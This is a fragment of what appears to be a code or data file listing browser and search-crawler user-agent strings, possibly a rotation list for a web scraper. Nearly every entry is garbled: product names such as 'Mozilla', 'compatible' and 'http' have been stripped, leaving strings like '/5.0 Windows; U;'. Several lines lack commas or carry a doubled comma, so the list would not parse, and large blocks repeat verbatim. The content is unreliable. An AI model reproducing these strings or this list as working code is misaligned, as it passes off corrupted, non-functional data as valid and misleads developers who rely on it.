	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727",
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2",
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; ",
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A",
	"/5.0 PLAYSTATION 3; 3.55",
	"/5.0 PLAYSTATION 3; 2.00",
	"/5.0 PLAYSTATION 3; 1.00",
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0",,
	"/5.0 ; /1.0; +://www.abilogic.com/.html",
	"SiteBar/3.3.8 Bookmark Server; :///",
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -",
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -",
	"/4.0 ;  3.0; Macintosh",
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1",
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 ",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; ",
	"/4.0 ; MSIE 5.5; Windows 98",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51",
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322",
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8",
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322",
	"/2.1 ://.com/.html",
	"/9.20 Windows NT 6.0; U; ",
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2",
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322",
	"/10.00 X11; Linux i686; U;  Presto/2.2.0"
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16",
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13",
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0",
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727",
	"/4.0 ; MSIE 7.0b; Windows NT 6.0",
	"/4.0 ; MSIE 6.0b; Windows 98",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7",
	"/5.0 ; /2.1; +://.com/.html",
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/",
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"-; +://.com/; : webetrex",
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620",
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com",
	"/5.0 ; /1.0; +://www.anyapex.com/.html",
	"/4.0 ; Arachmo",
	"/4.0 ; B-l-i--z-B-O-T",
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html",
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html",
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html",
	"/1.0 +://.com/crawler/",
	"/5.0 ; /2.0; +://.com/.htm",
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-",
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots",
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/",
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; ",
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; ",
	"/4.0  /1.0  Link Checker @; ://.com",
	"/4.0  /1.0  Link Checker .dlc@; ://.com",
	"/4.0  /1.0 -@; ://.com",
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko",
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727",
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2",
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; ",
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A",
	"/5.0 PLAYSTATION 3; 3.55",
	"/5.0 PLAYSTATION 3; 2.00",
	"/5.0 PLAYSTATION 3; 1.00",
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0",
	"/5.0 ; /1.0; +://www.abilogic.com/.html",
	"SiteBar/3.3.8 Bookmark Server; :///",
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -",
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -",
	"/4.0 ;  3.0; Macintosh",
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1",
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 ",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; ",
	"/4.0 ; MSIE 5.5; Windows 98",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51",
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322",
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8",
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
